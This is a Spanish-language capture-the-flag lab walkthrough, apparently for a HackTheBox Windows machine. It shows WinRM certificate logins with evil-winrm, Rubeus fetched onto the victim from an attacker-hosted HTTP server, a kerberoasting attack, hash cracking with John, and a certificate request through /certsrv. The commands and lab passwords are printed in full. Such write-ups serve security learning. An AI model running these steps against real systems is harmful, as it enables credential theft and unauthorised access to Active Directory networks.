## Vuln exploit & Gaining Access {-}

### Ganando accesso con Win-RM SSL {-}


```bash
mv /home/s4vitar/Downloads/certnew.cer .
evil-winrm -S -c certnew.cer -k amanda.key -i 10.10.10.103 -u 'amanda' -p 'Ashare1972'
```

ya estamos a dentro de la maquina pero no podemos ver la flag. Como previsto aqui vamos a tener que convertirnos al usuar **MRKLY**.


### Kerberoasting attack con Rubeus {-}

1. Descargamos el rubeus.exe

    ```bash
    wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
    python -m http.server 80
    ```

1. Lo descargamos desde la maquina victima

    ```powershell
    cd C:\Windows\Temp
    mkdir BH
    cd BH
    iwr -uri http://10.10.16.3/Rubeus.exe -Outfile Rubeus.exe
    ```

1. Lanzamos el binario

    ```powershell
    C:\Windows\Temp\BH\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972
    ```

Ya podemos ver el hash NTLM de version 2 del usuario **MRKLY**

### Crackeando el hash con John {-}

Copiamos el hash en un fichero y le lanzamos John

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt mrkly_hash
```

Aqui ya tenemos la contraseña del usuario. Aqui no vamos a poder connectarnos a la maquina victima con este usuario porque
tenemos que crear un nuevo certificado.

Entramos con firefox a la routa `/certsrv` con las credenciales del usuario MRKLY.

1. En la web le damos a `Request Certificate -> advanced certificate request`
1. Creamos un certificado (Private Key) en la maquina de atacante

    ```bash
    openssl req -newkey rsa:2048 -nodes -keyout mrkly.key -out mrkly.csr
    cat mrkly.csr | tr -d '\n' | xclip -sel clip
    ```

1. Colamos el contenido en la web y podemos descargar el DER encode certificate.

```bash
    mv /home/s4vitar/Downloads/certnew.cer .
    evil-winrm -S -c certnew.cer -k mrkly.key -i 10.10.10.103 -u 'mrkly' -p 'Football#7'
```

Ya podemos leer la Flag.
